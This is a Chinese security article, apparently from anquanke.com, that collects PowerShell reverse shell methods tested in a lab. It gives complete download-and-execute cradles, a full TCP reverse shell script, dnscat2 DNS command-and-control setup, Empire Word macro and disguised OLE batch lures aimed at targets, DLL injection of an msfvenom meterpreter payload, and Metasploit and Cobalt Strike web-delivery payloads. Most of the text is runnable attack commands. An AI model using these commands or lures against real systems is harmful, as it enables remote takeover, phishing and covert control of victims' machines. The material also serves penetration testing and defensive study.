> 原文链接: https://www.anquanke.com//post/id/99793 


# powershell反弹shell常见方式


                                阅读量   
                                **529932**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01b73fecd597edcc66.jpg)](https://p4.ssl.qhimg.com/t01b73fecd597edcc66.jpg)



> <p>本文整理了通过powershell反弹shell的常见方式。利用powercat、dnscat2、nishang、Empire、PowerSploit、Metasploit、Cobalt strike、powershell自定义函数等方式反弹TCP/UDP/HTTP/HTTPS/ICMP/DNS等类型shell。<br>**测试环境说明**<br>
攻击者：KALI2.0 32位 192.168.159.134<br>
攻击者2：Ubuntu 14.04 LTS 192.168.159.129 （仅在dnscat2 反弹DNS shell中使用）<br>
目标机：Windows Server 2008 X64 192.168.159.138</p>



## powercat反弹shell

powercat（[https://github.com/besimorhino/powercat](https://github.com/besimorhino/powercat) ）为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat

攻击者(192.168.159.134)开启监听：<br>`nc -lvp 6666`<br>
或者使用powercat监听<br>`powercat -l -p 6666`

目标机反弹cmd shell：

```
powershell IEX (New-Object System.Net.Webclient).DownloadString
('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');
powercat -c 192.168.159.134 -p 6666 -e cmd
```

[![](https://p4.ssl.qhimg.com/t01abbf16b5183e0f63.png)](https://p4.ssl.qhimg.com/t01abbf16b5183e0f63.png)

[![](https://p4.ssl.qhimg.com/t01be47bdd840ef65d9.png)](https://p4.ssl.qhimg.com/t01be47bdd840ef65d9.png)



## nishang反弹shell

Nishang([https://github.com/samratashok/nishang](https://github.com/samratashok/nishang) )是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。说明：本文没有具体实现nishang反弹http/https shell



## Reverse TCP shell

攻击者(192.168.159.134)开启监听：<br>`nc -lvp 6666`

目标机执行：

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666
```

或者将nishang下载到攻击者本地：<br>`powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666`<br>[![](https://p4.ssl.qhimg.com/t01cd5e14ecee393b16.png)](https://p4.ssl.qhimg.com/t01cd5e14ecee393b16.png)

[![](https://p4.ssl.qhimg.com/t01aa7977d45a756bcd.png)](https://p4.ssl.qhimg.com/t01aa7977d45a756bcd.png)



## Reverse UDP shell

攻击者(192.168.159.134)开启监听：<br>`nc -lvup 53`

目标机执行：

```
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellUdp.ps1');
Invoke-PowerShellUdp -Reverse -IPAddress 192.168.159.134 -port 53
```

[![](https://p2.ssl.qhimg.com/t018774879a94cd66ea.png)](https://p2.ssl.qhimg.com/t018774879a94cd66ea.png)

[![](https://p4.ssl.qhimg.com/t01a05a3a0d929b0f02.png)](https://p4.ssl.qhimg.com/t01a05a3a0d929b0f02.png)



## Reverse ICMP shell

需要利用icmpsh_m.py ([https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1](https://github.com/inquisb/icmpsh)%E5%92%8Cnishang%E4%B8%AD%E7%9A%84Invoke-PowerShellIcmp.ps1) 来反弹ICMP shell。

首先攻击端下载icmpsh_m.py文件

```
icmpsh_m.py Usage：
python icmpsh_m.py [Attacker IP] [Victim IP]
```

攻击者(192.168.159.134)执行：

```
sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包
python icmpsh_m.py 192.168.159.134 192.168.159.138 #开启监听
```

目标机(192.168.159.138)执行： `powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress 192.168.159.134`

```` [![](https://p5.ssl.qhimg.com/t01c553ebfac7a01007.png)](https://p5.ssl.qhimg.com/t01c553ebfac7a01007.png)

[![](https://p5.ssl.qhimg.com/t01bbc01cb8019f661b.png)](https://p5.ssl.qhimg.com/t01bbc01cb8019f661b.png)



## 自定义powershell函数反弹shell

利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp shell，其实也是借鉴nishang中的Invoke-PowerShellTcpOneLine.ps1

攻击者(192.168.159.134) 开启监听：<br>`nc -lvp 6666`

目标机执行：

```
powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('192.168.159.134',6666);$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%`{`0`}`;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`{`;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()`}`;$client.Close()"
```

[![](https://p1.ssl.qhimg.com/t01d81391bf8fc6700e.png)](https://p1.ssl.qhimg.com/t01d81391bf8fc6700e.png)<br>[![](https://p0.ssl.qhimg.com/t01d4ac654e6c5cd63c.png)](https://p0.ssl.qhimg.com/t01d4ac654e6c5cd63c.png)

或者保存为lltest_tcp.ps1文件<br>`powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/lltest_tcp.ps1');Invoke-lltestTcp`<br>
lltest_tcp.ps1 如下：

```
function Invoke-lltestTcp
`{`
$client = New-Object Net.Sockets.TCPClient('192.168.159.134',6666)
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%`{`0`}`
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
`{`
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
$sendback = (iex $data 2&gt;&amp;1 | Out-String )
$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; '
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
$stream.Write($sendbyte,0,$sendbyte.Length)
$stream.Flush()
`}`
$client.Close()
`}`
```



# <a class="reference-link" name="dnscat2%20%E5%8F%8D%E5%BC%B9DNS%20shell"></a>dnscat2 反弹DNS shell

dnscat2([https://github.com/iagox86/dnscat2](https://github.com/iagox86/dnscat2) )是一个DNS隧道，旨在通过DNS协议创建加密的命令和控制（C＆C）通道。dnscat2分为两部分：客户端和服务器。dnscat2客户端采用C语言编写，服务器端采用ruby语言编写。后来又有安全研究人员使用PowerShell脚本重写了dnscat2客户端dnscat2-powershell([https://github.com/lukebaggett/dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell))

利用dnscat2 和 dnscat2-powershell实现反弹DNS shell:

攻击者(Ubuntu 14.04 LTS 192.168.159.129)开启监听：<br>`ruby dnscat2.rb --dns "domain=lltest.com,host=192.168.159.129" --no-cache -e open`<br>
-e open 不使用加密连接，默认使用加密<br>
ruby dnscat2.rb —help 查看帮助

目标机执行：<br>`powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1');Start-Dnscat2 -Domain lltest.com -DNSServer 192.168.159.129`<br>
成功反弹shell后，攻击者：<br>`session -i 1 #进入到session 1`<br>`shell  #执行之后会新生成一个session  需要通过session -i 2 切换`<br>`session -i 2`<br>[![](https://p0.ssl.qhimg.com/t017cde53535692e80c.png)](https://p0.ssl.qhimg.com/t017cde53535692e80c.png)

[![](https://p5.ssl.qhimg.com/t01fcafec48c894153d.png)](https://p5.ssl.qhimg.com/t01fcafec48c894153d.png)

[![](https://p5.ssl.qhimg.com/t01ad13f367a43f1991.png)](https://p5.ssl.qhimg.com/t01ad13f367a43f1991.png)

[![](https://p0.ssl.qhimg.com/t01b0bc38ec839d94bc.png)](https://p0.ssl.qhimg.com/t01b0bc38ec839d94bc.png)



## Empire 结合office反弹shell

Empire([https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire) ) 基于powershell的后渗透攻击框架，可利用office 宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell

### <a class="reference-link" name="%E5%88%A9%E7%94%A8office%20%E5%AE%8F%E5%8F%8D%E5%BC%B9shell"></a>利用office 宏反弹shell

攻击者(192.168.159.134)开启监听:<br>`uselistener http`<br>`execute`<br>`back`<br>`usestager windows/macro http  #生成payload`<br>`execute`<br>[![](https://p3.ssl.qhimg.com/t01ebd92ae5c2752d1a.png)](https://p3.ssl.qhimg.com/t01ebd92ae5c2752d1a.png)

[![](https://p4.ssl.qhimg.com/t01c424d48628a2722b.png)](https://p4.ssl.qhimg.com/t01c424d48628a2722b.png)<br>
生成/tmp/macro 攻击代码后，新建一个word 创建宏

[![](https://p1.ssl.qhimg.com/t017c0553a3aab1b9de.png)](https://p1.ssl.qhimg.com/t017c0553a3aab1b9de.png)<br>
点击“文件”-“宏”-“创建”，删除自带的脚本，复制进去/tmp/macro文件内容，并保存为“Word 97-2003文档(**.doc)”或者“启用宏的Word 文档(**.docm)”文件，当诱导目标打开，执行宏后，即可成功反弹shell：<br>
说明:需要开启宏或者用户手动启用宏。开启宏设置：“文件”-“选项”-“信任中心”,选择“启用所有宏”

[![](https://p4.ssl.qhimg.com/t0110d78f8b6dc573b7.png)](https://p4.ssl.qhimg.com/t0110d78f8b6dc573b7.png)

[![](https://p5.ssl.qhimg.com/t0153edfb39e2d25b0e.png)](https://p5.ssl.qhimg.com/t0153edfb39e2d25b0e.png)

### <a class="reference-link" name="%E5%88%A9%E7%94%A8office%20OLE%E5%AF%B9%E8%B1%A1%E6%8F%92%E5%85%A5bat%E6%96%87%E4%BB%B6%E5%8F%8D%E5%BC%B9shell"></a>利用office OLE对象插入bat文件反弹shell

攻击者(192.168.159.134)开启监听 并生成bat文件payload：<br>`listeners`<br>`usestager windows/launcher_bat http`<br>`execute`<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t017b89a4956e058dd2.png)

在word中“插入”-“对象”-“由文件创建” 处，插入launcher.bat文件，可更改文件名称和图标，进行伪装，当诱导目标点击launcher_lltest.xls文件，执行后，即可成功反弹shell：

[![](https://p5.ssl.qhimg.com/t019fac2fa169e37faf.png)](https://p5.ssl.qhimg.com/t019fac2fa169e37faf.png)

[![](https://p4.ssl.qhimg.com/t01df44007f3dfd7c7f.png)](https://p4.ssl.qhimg.com/t01df44007f3dfd7c7f.png)

[![](https://p5.ssl.qhimg.com/t01d3703513e3d73d1a.png)](https://p5.ssl.qhimg.com/t01d3703513e3d73d1a.png)



## PowerSploit DLL注入反弹shell

PowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。<br>
利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell

1）msfvenom生成dll后门<br>`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.159.134 lport=6667 -f dll -o /var/www/html/PowerSploit/lltest.dll`<br>
说明：目标机64位 用x64 ； 32位的话用windows/meterpreter/reverse_tcp

[![](https://p4.ssl.qhimg.com/t01b4caf8412924dfcc.png)](https://p4.ssl.qhimg.com/t01b4caf8412924dfcc.png)

2）metasploit 设置payload 开启监听

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.159.134
set LPORT 6667
exploit
```

[![](https://p0.ssl.qhimg.com/t012d0e9a74a7f468ca.png)](https://p0.ssl.qhimg.com/t012d0e9a74a7f468ca.png)

3）powershell 下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门<br>
首先上传dll文件到目标机。然后Get-Process 选定一个进程，最后注入到该进程

目标机执行:

```
Get-Process #选择要注入的进程
IEX (New-Object Net.WebClient).DownloadString("http://192.168.159.134/PowerSploit/CodeExecution/Invoke-DllInjection.ps1")
Invoke-DllInjection -ProcessID 5816 -Dll C:UsersAdministratorDesktoplltest.dll
```

[![](https://p3.ssl.qhimg.com/t013b399a39f86d7729.png)](https://p3.ssl.qhimg.com/t013b399a39f86d7729.png)

[![](https://p3.ssl.qhimg.com/t01121eca1107d335a1.png)](https://p3.ssl.qhimg.com/t01121eca1107d335a1.png)

[![](https://p0.ssl.qhimg.com/t017f8aa99b2a307bcf.png)](https://p0.ssl.qhimg.com/t017f8aa99b2a307bcf.png)

[![](https://p3.ssl.qhimg.com/t01ebe09a11da4904bc.png)](https://p3.ssl.qhimg.com/t01ebe09a11da4904bc.png)



## metasploit反弹shell

利用metasploit的web_delivery模块可通过python、php、powershell、regsvr32等进行反弹shell

攻击者(192.168.159.134)：

```
use exploit/multi/script/web_delivery
set PAYLOAD windows/meterpreter/reverse_tcp
set target 2
set LHOST 192.168.159.134
set LPORT 6666
exploit
目标机执行：
powershell.exe -nop -w hidden -c $f=new-object net.webclient;$f.proxy=[Net.WebRequest]::GetSystemWebProxy();
$f.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $f.downloadstring('http://192.168.159.134:8080/4iNSwaMtwWjm');
```

[![](https://p2.ssl.qhimg.com/t01059c412e75c4ff00.png)](https://p2.ssl.qhimg.com/t01059c412e75c4ff00.png)

[![](https://p4.ssl.qhimg.com/t0154717c97e799d852.png)](https://p4.ssl.qhimg.com/t0154717c97e799d852.png)



## Cobalt strike反弹shell

Cobalt strike的Scripted Web Delivery模块，可通过bitsadmin、powershell、python、regsvr32等进行反弹shell，类似metasploit的web_delivery模块<br>
说明：安装Cobalt strike时推荐 java version “1.8.0_121”

1)运行服务端<br>`./teamserver 192.168.159.134 lltest  #lltest为连接密码`

2)运行客户端：<br>`./cobaltstrike    #用户名随便输入  密码lltest`

3)开启监听:<br>
首先要创建一个Listener, 点击 Cobalt Strike-&gt;Listeners ，然后点击Add便可创建Listeners

点击Cobalt Strike-&gt;Listeners<br>
payload可选择windows/beacon_http/reverse_http<br>
说明：其中windows/beacon** 是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，windows/foreign** 为外部监听器，即msf或者Armitage的监听器。

[![](https://p0.ssl.qhimg.com/t0120344c7cf8e44ed7.png)](https://p0.ssl.qhimg.com/t0120344c7cf8e44ed7.png)

4)生成powershell payload:<br>
点击Attack -&gt; Web Drive-by -&gt; Scripted Web Delivery<br>
Type选择 powershell

[![](https://p5.ssl.qhimg.com/t016f6972c0aee91a3c.png)](https://p5.ssl.qhimg.com/t016f6972c0aee91a3c.png)

5)目标机执行powershell payload:<br>`powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.159.134:83/a'))"`<br>
6)成功反弹shell后，右键interact 进入shell<br>[![](https://p4.ssl.qhimg.com/t0163313c089b761be5.png)](https://p4.ssl.qhimg.com/t0163313c089b761be5.png)



## 参考

[https://decoder.cloud/2017/01/26/dirty-tricks-with-powershell/](https://decoder.cloud/2017/01/26/dirty-tricks-with-powershell/)<br>[https://www.blackhillsinfosec.com/powershell-dns-command-control-with-dnscat2-powershell/](https://www.blackhillsinfosec.com/powershell-dns-command-control-with-dnscat2-powershell/)<br>[https://enigma0x3.net/2016/03/15/phishing-with-empire/](https://enigma0x3.net/2016/03/15/phishing-with-empire/)<br>[http://www.hackingarticles.in/command-injection-exploitation-using-web-delivery-linux-windows/](http://www.hackingarticles.in/command-injection-exploitation-using-web-delivery-linux-windows/)<br>[https://evi1cg.me/archives/Nishang_shells.html](https://evi1cg.me/archives/Nishang_shells.html)<br>[https://evi1cg.me/archives/Cobalt_strike.html](https://evi1cg.me/archives/Cobalt_strike.html)
